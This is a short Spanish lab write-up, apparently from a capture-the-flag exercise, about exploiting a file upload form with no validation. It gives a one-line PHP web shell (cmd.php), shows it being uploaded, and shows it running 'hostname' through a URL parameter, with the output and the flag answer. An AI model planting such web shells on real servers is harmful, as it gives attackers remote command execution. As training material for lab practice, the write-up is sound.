# Laboratorio: Absent Validation 📃

1. Visitamos la página web

<p align="center">
    <img src="./assets/Absent/01-Web.PNG" width=400>
</p>

---
2. Subimos un archivo `cmd.php` con el cual podremos ejecutar comandos

* **cmd.php**
```php
<?php system($_GET['cmd']); ?>
```

---
3. Ahora ejecutaremos el comando `hostname`
* **URL:** `http://[IP]/uploads/cmd.php?cmd=hostname`

**Output**
```
ng-760311-fileuploadsabsentverification-ajvog-54759766bd-gvq6k
```

* **Respuesta:** `fileuploadsabsentverification`